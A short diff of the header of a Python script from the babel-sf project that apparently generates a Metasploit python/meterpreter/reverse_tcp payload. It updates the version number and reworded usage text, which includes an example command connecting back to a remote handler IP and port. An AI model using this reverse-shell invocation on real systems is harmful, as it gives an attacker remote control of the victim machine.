@@ -1,6 +1,6 @@
 #!/usr/bin/python
 #
-# msf-meterpreter-reverse_tcp.py version 0.2
+# msf-meterpreter-reverse_tcp.py version 0.3
 #
 # babel-sf ( https://github.com/attackdebris/babel-sf )
 #
@@ -12,7 +12,7 @@ import datetime
 i = datetime.datetime.today()
 
 instructions = 	"msf-meterpreter-reverse_tcp.py ( https://github.com/attackdebris/babel-sf )\n" +\
-		"\n[This script should be utilised with a python/meterpreter/reverse_tcp msf handler payload]\n" +\
+		"\n[This script should be used with msf: exploit/multi/handler > payload: python/meterpreter/reverse_tcp]\n" +\
 		"\nUsage:" +\
 		"\n  python msf-meterpreter-reverse_tcp.py [remote handler IP] [port]" +\
 		"\n  e.g. python msf-meterpreter-reverse_tcp.py 192.168.0.1 4444"
